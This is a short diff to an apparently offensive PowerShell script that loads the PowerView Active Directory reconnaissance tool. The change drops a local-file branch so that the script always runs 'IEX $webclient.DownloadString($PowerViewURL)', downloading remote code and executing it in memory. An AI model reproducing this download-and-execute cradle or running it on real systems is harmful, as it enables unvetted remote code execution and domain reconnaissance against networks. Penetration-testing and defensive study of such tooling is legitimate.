@@ -132,14 +132,6 @@ Param(
 	#Download PowerView from specified URL or from GitHub.
 	try {
 		Write-Host "[>]Downloading Powerview | " -NoNewLine
-		
-		if (Test-Path .\PowerView.ps1){
-			Write-Host "[Skipping Download] " -NoNewLine -ForegroundColor Yellow
-			Write-Host "PowerView.ps1 Present | " -NoNewLine
-			IEX $webclient.DownloadString('.\PowerView.ps1')
-			Write-Host "Success" -ForegroundColor Green
-		}
-		else {	
 			Write-Host "$PowerViewURL | " -NoNewLine
 			IEX $webclient.DownloadString($PowerViewURL)
 			Write-Host "Success" -ForegroundColor Green
